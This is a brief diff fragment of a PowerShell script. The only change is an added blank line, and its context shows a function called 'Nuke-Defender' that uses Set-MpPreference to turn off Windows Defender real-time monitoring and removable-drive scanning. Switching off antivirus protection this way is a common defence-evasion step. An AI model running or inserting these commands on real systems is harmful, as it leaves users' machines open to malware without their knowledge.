@@ -1,3 +1,4 @@
+
 function Nuke-Defender{
     Set-MpPreference -DisableRealtimeMonitoring $true | Out-Null
     Set-MpPreference -DisableRemovableDriveScanning $true | Out-Null
